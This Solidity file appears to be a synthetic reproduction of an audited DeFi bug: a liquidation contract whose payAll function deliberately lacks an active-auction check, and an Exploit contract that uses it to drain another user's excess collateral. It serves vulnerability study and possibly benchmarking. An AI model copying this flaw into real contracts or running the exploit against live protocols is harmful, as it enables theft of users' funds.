// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// Synthetic reduction of AuditVault #16980 (Yield V2).
contract CollateralToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient collateral");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Witch {
    CollateralToken public immutable collateral;
    struct Vault {
        address owner;
        uint256 collateralAmount;
        uint256 debt;
    }
    mapping(uint256 => Vault) public vaults;
    mapping(uint256 => bool) public activeAuction;
    uint256 public nextVaultId = 1;

    constructor(CollateralToken token) {
        collateral = token;
        token.mint(address(this), 1_000);
    }

    function openVault(address owner, uint256 collateralAmount, uint256 debt) external returns (uint256 id) {
        id = nextVaultId++;
        vaults[id] = Vault(owner, collateralAmount, debt);
    }

    function payAll(uint256 id) external {
        Vault storage vault = vaults[id];
        require(vault.owner != address(0), "unknown vault");
        uint256 excess = vault.collateralAmount - vault.debt;
        // FIX: require(activeAuction[id], "auction inactive");
        vault.collateralAmount = vault.debt; // @> VULN: payAll liquidates collateral without an active auction.
        collateral.transfer(msg.sender, excess);
    }
}

contract Exploit {
    CollateralToken public collateral;
    Witch public witch;
    uint256 public vaultId;
    uint256 public stolenCollateral;

    constructor() {
        collateral = new CollateralToken();
        witch = new Witch(collateral);
    }

    function run() external {
        // Alice's overcollateralized vault is not in an auction.
        vaultId = witch.openVault(address(0xA11CE), 1_000, 400);
        require(!witch.activeAuction(vaultId), "auction unexpectedly active");
        // Bob invokes payAll and receives the excess collateral for free.
        witch.payAll(vaultId);
        stolenCollateral = collateral.balanceOf(address(this));
        require(stolenCollateral == 600, "inactive vault was not drained");
    }
}
